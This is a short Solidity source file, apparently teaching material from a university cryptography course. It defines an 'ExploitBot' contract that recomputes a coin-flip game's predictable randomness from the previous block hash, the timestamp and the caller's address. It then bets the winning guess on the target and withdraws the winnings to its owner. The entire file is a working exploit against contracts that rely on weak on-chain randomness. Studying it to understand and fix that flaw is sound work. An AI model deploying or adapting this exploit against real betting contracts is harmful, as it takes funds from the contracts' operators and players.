// SPDX-License-Identifier: MIT
// Code for teaching purposes only.
// See University of Basel cryptolectures.io

pragma solidity ^0.8.9;

interface ICoinFlip {
    function flip(uint8 guess) external payable;
}

contract ExploitBot {
    ICoinFlip public immutable target;
    address public owner;

    constructor(address _target) {
        require(_target != address(0), "Target is zero");
        target = ICoinFlip(_target);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "You must be able to see it Mr. Anderson. You must know it by now. You cannot win!");
        _;
    }

    // Compute the outcome the target will use when this contract is the caller.
    function predictedResult() public view returns (uint8) {
        uint256 r = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    address(this)
                )
            )
        );
        return uint8(r % 2); // 0 = Heads, 1 = Tails
    }

    // Attack: forwards the wager and calls flip with the correct guess.
    function attack() external payable {
        require(msg.value > 0, "Send ETH to bet");
        uint8 guess = predictedResult();
        target.flip{value: msg.value}(guess);
    }

    // Withdraw ETH balance back to the owner
    function withdraw() external onlyOwner {
        uint256 amount = address(this).balance;
        require(amount > 0, "No ETH to withdraw");
        (bool ok, ) = owner.call{value: amount}("");
        require(ok, "Withdrawal failed");
    }

    // Allow receiving ETH (e.g. winnings from target contract)
    receive() external payable {}
}
